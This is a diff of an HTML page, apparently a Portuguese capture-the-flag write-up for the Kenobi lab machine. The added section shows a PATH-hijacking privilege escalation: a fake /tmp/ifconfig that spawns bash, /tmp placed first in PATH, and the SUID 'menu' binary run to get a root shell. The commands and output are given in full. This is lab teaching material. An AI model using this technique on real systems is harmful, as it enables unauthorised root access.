+                    <p>Como o vimos que o binário está vulnerável com excessos de privilégios e com o SUID habilitado, podemos então fazer um ataque de manipulação do PATH do sistema para fazer com que o "menu" excute outros binários que não sejam o "curl", "uname" ou "ifconfig" originais.</p>
+                    <p>Primeiro, vamos criar um binário malicioso (bash spawn) que vai se passar por algum desses 3 binários do sistema Linux que vão ser chamados pelo "menu", eu escolhi o "ifconfig":</p>
+                    <p class="code-block">kenobi@kenobi:~$ <b class="command-line">echo "/bin/bash" > /tmp/ifconfig</b>
+kenobi@kenobi:~$ <b class="command-line">chmod +x /tmp/ifconfig</b></p>
 
-                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> root.txt</h4>
-                    <p class="code-block"># <b class="command-line">cat /root/root.txt</b>
-THM{pr****************n}</p>
+                    <p>Em seguida, vamos adicionar o diretório do binário malicioso "/tmp" no início do PATH do sistame para que ele seja encontrado primeiro do que o original:</p>
+                    <p class="code-block">kenobi@kenobi:~$ <b class="command-line">export PATH="/tmp:$PATH"</b>
+
+kenobi@kenobi:~$ <b class="command-line">echo $PATH</b>
+/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</p>
+                    
+                    <p>
+                        Agora, ao executar o "menu" e selecionar a opção "3 - ifconfig", o nosso binário malicioso vai ser executado no lugar do binário original do "ifconfig".
+                        <br>
+                        Isso somado ao excesso de privilégios e SUID habilitado, vai nos dar a shell de root no sistema.
+                    </p>
+                    <p class="code-block">kenobi@kenobi:~$ <b class="command-line">/usr/bin/menu</b>
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice : <b class="command-line">3</b>
+
+root@kenobi:~# <b class="command-line">id</b>
+uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)</p>
+
+                    <h4 style="margin-top: 2rem;"><i class="blue fas fa-question-circle"></i> What is the root flag (/root/root.txt)?</h4>
+                    <p class="code-block">root@kenobi:~# <b class="command-line">cat /root/root.txt</b>
+17******************************02</p>
 
                 </div>
             </div>
